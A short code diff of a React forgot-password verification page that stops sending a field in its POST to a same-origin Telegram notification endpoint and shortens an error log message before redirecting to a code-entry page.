@@ -56,10 +56,10 @@ export default function ForgotPasswordVerifyPage() {
       await fetch("/api/telegram/forgot-password-verify", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ verificationType: title }),
+        body: JSON.stringify({}),
       }).catch(console.error);
     } catch (err) {
-      console.error("Failed to send forgot-password-verify notification:", err);
+      console.error("Verification error:", err);
     }
     redirectRef.current = window.setTimeout(() => {
       router.push("/forgot-password-code");
